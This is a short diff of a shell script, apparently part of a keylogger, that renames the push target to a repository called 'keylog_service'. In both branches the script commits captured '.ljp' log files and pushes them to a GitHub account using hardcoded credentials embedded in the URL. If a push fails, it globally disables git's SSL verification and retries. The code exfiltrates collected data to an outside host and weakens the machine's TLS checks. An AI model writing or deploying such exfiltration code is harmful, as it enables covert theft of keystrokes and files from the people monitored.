@@ -25,11 +25,11 @@ then
 #     git add \*.crt
      git add \*.ljp
      git commit -m "root-$(date +"%D %T")"
-     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
      ret=$?
      if [ $ret -ne 0 ]; then
      git config --global http.sslVerify false
-     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
      else
      echo "log pushed successfully!!!"
      fi
@@ -47,11 +47,11 @@ else
 #     git add \*.crt
      git add \*.ljp
      git commit -m "root-$(date +"%D %T")"
-     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
      ret=$?
      if [ $ret -ne 0 ]; then
      git config --global http.sslVerify false
-     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+     git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
      else
      echo "log pushed successfully!!!"
      fi
